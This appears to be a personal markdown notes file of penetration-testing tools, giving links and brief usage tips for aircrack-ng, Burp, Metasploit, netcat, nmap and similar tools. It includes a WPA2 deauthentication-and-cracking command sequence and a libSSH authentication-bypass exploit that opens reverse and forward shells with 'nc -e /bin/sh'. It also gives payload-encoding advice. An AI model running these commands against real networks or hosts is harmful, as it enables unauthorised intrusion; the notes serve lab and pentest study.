# NOTES

### Air--ng: https://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-using-aircrack-ng-0148366/ (crack wifi) <br>
Get an external wireless network adapter. From a Kali box:<br>
``` airmon-ng start wlan0 #put the adapter in monitor mode```<br>
``` airodump-ng <InterfaceName> #capture packets```<br>
Execute the next 2 at the same time from different terminals. If the first comes back with WPA Handshake in the top right, you're successful!<br>
``` airodump-ng --bssid 08:86:30:74:22:76 -c <Channel> --write WPAcrack <InterfaceName> #capture more packets```<br>
``` aireplay-ng --deauth 100 -a 08:86:30:74:22:76 <InterfaceName> #deauthorize all the users```<br>
Then execute this, assuming the WPA Handshake was returned.<br>
```aircrack-ng WPAcrack-01.cap -w /passwordlist.txt #crack the captured password``` <br>

### Anaconda: https://docs.anaconda.com/anaconda/user-guide/getting-started/ (for virtualenvironments) <br>
``` conda activate <environment name> ```
Use miniconda to install way faster and with minimal space requirements...

### Atomic Red Team: https://github.com/redcanaryco/atomic-red-team (MITRE Attack Detection Tests) <br>
- Getting started: https://github.com/redcanaryco/invoke-atomicredteam

### Bettercap: https://www.bettercap.org/ (for all things network traffic) <br>
``` 
docker pull bettercap/bettercap
docker run -it --privileged --net=host bettercap/bettercap -h
```

### Boofuzz: https://github.com/jtpereyda/boofuzz (for fuzzing/input validation testing) <br>
Admin command prompt:
```
choco install mingw -y
choco install unzip -y
```
Anaconda (non-admin) prompt:
```
conda create -n boofuzz python=2.7 -y
conda activate boofuzz
cd Documents
mkdir boofuzz
cd boofuzz
pip install boofuzz
```
For messing with vulnserver: https://medium.com/@Z3R0th/a-simple-buffer-overflow-using-vulnserver-86b011eb673b <br>
DEPENDENCIES: <br>
- libdasm
- pydbg
- procmon
- VCforPython27

### Burp Suite Scanner https://portswigger.net/burp (vulnerability scanner) <br>
Find vulnerabilites in an easier, more automated way.
- Pay attention to all tabs/subtabs/etc...especially the filter one is helpful.
- SQL injection: repeater/intruder tab. Repeater messes with and resends requests, intruder runs payloads. (On intruder, set a marker, set a payload, and mass test for stuff. Various modes, maybe use sniper?)
- Increase memory if needed: ```java -jar -Xmx2g <path to burp jar file> (increases memory to 2Gigs```
- Set browser to use proxy, ```127.0.0.1:8080``` for all protocols. After setting browser to use proxy, go to 127.0.0.1:8080 and pull the CA cert. Import this into your browser and you're set.
- Intercept catpures and stops traffic. With intercept off, burp just logs traffic in ```Proxy->HTTP history```
- Target shows a site tree. Use the ```new scan``` button on the dashboard to build the site tree after adding target to scope.
- Sequencer tests randomness. Could test session ID/cookie/etc. Gives results based on like how often does 'z' show vs 'a'? How random is the string?
- Decoder tries to decode input into a readable format. Can do HTML/hash functions/etc
- Comparer is a diff. Can do comparisons on words (space delimiter) and bytes.
- Note, scanning url.com won't find x.url.com but will find url.com/y.
- Can get extensions for burp: https://portswigger.net/bappstore
- Use against a mobile app: https://portswigger.net/support/using-burp-to-enumerate-a-rest-api

### BYOBU: http://byobu.co/ (terminal manager) <br>
Make pretty terminals

### Cewl: https://tools.kali.org/password-attacks/cewl (password dictionary list creation) <br>
Give url, get password list. Can spider to a given depth.

### Chrome Dev Tools: [many] (a lot of cool things) <br>
Make sure that within the tabs you're dragging the window up; there're tools that are typically hidden in there. eg https://pureinfotech.com/download-windows-10-iso-without-media-creation-tool/ 

### CUPP: https://github.com/Mebus/cupp <br>
Enumerates possible user passwords based on input information on the target
- Use in conjunction with BEWGor

### EtherApe: https://github.com/IFGHou/EtherApe (graphical network traffic browser) <br>
- http://etherape.sourceforge.net/

### Exploit-db: https://www.exploit-db.com (find exploit code) <br>
Find code to test exploits

### Firefox Developer Edition: https://www.mozilla.org/en-US/firefox/developer/ (dev tools) <br>
Helps with editing cookies
- https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/?src=search
- foxyproxy

### Graffitti: https://www.kitploit.com/2019/05/graffiti-tool-to-generate-obfuscated.html?m=1 (obfuscate one-liners) <br>
"Graffiti comes complete with a database that will insert each encoded payload into it, in order to allow end users to view already created payloads for future use. The payloads can be encoded using the following techniques: Xor, Base64, Hex, ROT13, Raw"

### GoPhish: https://github.com/gophish/gophish <br>
Open-source phishing toolkit designed for businesses and penetration testers, has binaries for all platforms.

### Hping3: https://tools.kali.org/information-gathering/hping3 (network tester) <br>
- https://tools.kali.org/information-gathering/hping3

### Htop: https://hisham.hm/htop/ (UNIX terminal) <br>
Make pretty process views with green and red bars and stuff

### Immunity Debugger: https://www.immunityinc.com/products/debugger/ (basic debugger) <br>
Lets you attach a service to a debugger and watch the progress of services (helps with buffer overflows)

### Jupyter lab: https://jupyterlab.readthedocs.io/en/stable/getting_started/installation.html (for development) <br>
- Allows you to test run sections of code for troubleshooting purposes
- runs on localhost:888

### Massscan: https://github.com/robertdavidgraham/masscan (scan the whole internet) <br>
- 6 minutes. Scan the whole internet.
- https://tools.kali.org/information-gathering/masscan
- sudo masscan -iL ip-ranges.txt -p80, 443, 22, 135, 8080, 8000 -oG ipranges.gnmap

### Metasploit: https://www.metasploit.com/ (for all the malicious) <br>
- Already on kali. Enjoy.
- https://pentaroot.com/exploit-wordpress-backdoor-theme-pages/
#### EternalBlue: https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit (NSA tool)
- https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/
#### MSFVenom: https://www.offensive-security.com/metasploit-unleashed/msfvenom/ (buffer overflows) <br>
- When creating .exe, use shikata_ga_nai with the i flag.
- Shikata_ga_nai is always good to use

### Netcat: http://workrobot.com/sysadmin/security/netcat_cheatsheet.html (listeners) <br>
- Have nmap installed and this will work.
- Smaller (allowed for incident response work)
#### Example usage, using github.com/blacknbunny/libSSH-Authentication-Bypass/blob/master/libsshauthbypass.py:
TO GET REVERSE SHELL WITH THE VULNSERVER FOR TESTING SSHBYPASSAUTH (found at https://pentesterlab.com/exercises/cve-2018-10933):
```
python libsshauthbypass.py --host <VULNERABLE IP> -c "nc <YOUR HOST IP> <PORT> -e /bin/sh"
ncat -vlp <PORT>
```
TO GET FORWARD SHELL WITH THE VULNSERVER FOR TESTING SSHBYPASSAUTH (found at https://pentesterlab.com/exercises/cve-2018-10933):
```
python libsshauthbypass.py --host <VULNERABLE IP> -c "nc -vlp <PORT> -e /bin/sh"
ncat <VULNERABLE IP> <PORT>
```
IF YOU HAVE BASH AND PYTHON ON HOST, CONVERT FUGLY SHELL TO NICE SHELL WITH:
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

### Nmap: https://nmap.org/book/man-briefoptions.html (scanning ports & networks) <br>
- https://www.stationx.net/nmap-cheat-sheet/
- http://www.irongeek.com/i.php?page=backtrack-3-man/nmap
``` -oA ``` : Output in the three major formats at once
``` -O2 ``` : Only use the new OS detection system (no fallback)
``` -sV ``` : scan for version
``` -A ``` : get OS and version / scripts / tracerts
``` --script ``` : lets you run special commands (eg vuln)

### Openvas: https://hackertarget.com/install-openvas-gvm-on-kali/ (vulnerability scanner) <br>
After installation, this opens with a GUI on 127.0.0.1. Go to tasks, create a new task (star in upper left corner), then "play" the task.
- If Openvas greenbone commands aren't working on Kali because they got rid of the HTTP versions use ```greenbone-nvt-sync --rsync```

### OSINT Resources: <br>
- Map out info about a person: https://osintframework.com/
- Creating fake profiles: https://thispersondoesnotexist.com/
- Techniques: https://inteltechniques.com/book1.html
- Info on the network traffic of an IP address: https://iknowwhatyoudownload.com

### PacketTotal: https://packettotal.com/ (online packet analysis) <br>
- Upload pcap, it'll show the data nicely analyzed for you. Can export as csv and txt.

### Patator: https://github.com/lanjelot/patator/ (brute force all the things) <br>
"Patator was written out of frustration from using Hydra, Medusa, Ncrack, Metasploit modules and Nmap NSE scripts for password guessing attacks. I opted for a different approach in order to not create yet another brute-forcing tool and avoid repeating the same shortcomings. Patator is a multi-threaded tool written in Python, that strives to be more reliable and flexible than his fellow predecessors."

### Pihole: https://pi-hole.net/ (block all the ads) <br>
DNS Sinkhole for ads
1. create pihole/whitelist.txt and pihole/blacklist.txt
2. do not run apache on port 80 on the same machine
3. restart lighttpd when apache is killed
4. ignore the xheader warnings. They're fine.

### Proxies: [multiple] (separate your computer further from the attack) <br>
- foxyproxy
- https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project

### Pwndrop: https://breakdev.org/pwndrop <br>
- Makes it easy to host / point to payloads

### Reverse Shell: (Also see NetCat writeup) <br>
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### Scapy: https://github.com/secdev/scapy (create packets to attempt to annoy the system into responding) <br>
``` 
sr1(ARP(pdst="xxx.xxx.xxx.xxx")) #Replace the x's with the IP
```

- Preinstalled on Kali
- Wake on LAN
  - https://www.depicus.com/
  - https://blog.stalkr.net/2009/12/wake-on-lan-in-python.html
  - https://pypi.org/project/wakeonlan/

### Screen: https://linuxize.com/post/how-to-use-linux-screen/ (keep running commands) <br>
- screen -S [name]
- run command
- CTRL A & CTRL D to detatch from screen
- to rejoin screen later, screen -r [name]

### Shodan: https://www.shodan.io/ (search engine for sketchy, fun things (IoT, SCADA...))<br>
- https://null-byte.wonderhowto.com/how-to/set-up-ssh-server-with-tor-hide-from-shodan-hackers-0194455/

### Tails OS: https://tails.boum.org/ (live OS for all the privacies)<br>
- use the Internet anonymously and circumvent censorship
- all connections to the Internet are forced to go through the Tor network
- leave no trace on the computer you are using unless you ask it explicitly
- use state-of-the-art cryptographic tools to encrypt your files, emails and instant messaging

### Viewers: http://uvviewsoft.com<br>
Universal Viewer, Log Viewer; let you open otherwise unopenable files

### Virtualenv: https://virtualenv.pypa.io/ (jails for environments)<br>
Lets you install packages just for the specific environment instead of globally. Allows easy setup / takedown of dev environments.

### Watch: https://en.wikipedia.org/wiki/Watch_(Unix) (repeatedly run command and see results)<br>
``` watch [options] command [command options] ```

### WireEdit: https://omnipacket.com/downloads (easily edit packets)<br>
- Similar to scapy only with a GUI.

## Other References:<br>
- https://www.eff.org/
- https://www.netresec.com/?page=PcapFiles 
  - contains resources for online sandboxes that you can use to run malware/sketchy pcaps/whatever
- https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project/Pages/Offline
- https://pdrcybersecurity.com/10-sites-find-vulnerable-vms-testing/
- http://opensecuritytraining.info/Training.html
- https://medium.com/@alt3kx/build-an-easy-rdp-honeypot-with-raspberry-pi-3-and-observe-the-infamous-attacks-as-bluekeep-29a167f78cc1
- https://github.com/enaqx/awesome-pentest
- https://github.com/nixawk/pentest-wiki
- https://github.com/secdevops-cuse/CyberRange
- https://github.com/swisskyrepo/PayloadsAllTheThings
- msfvenom
- nasm
- red canary github
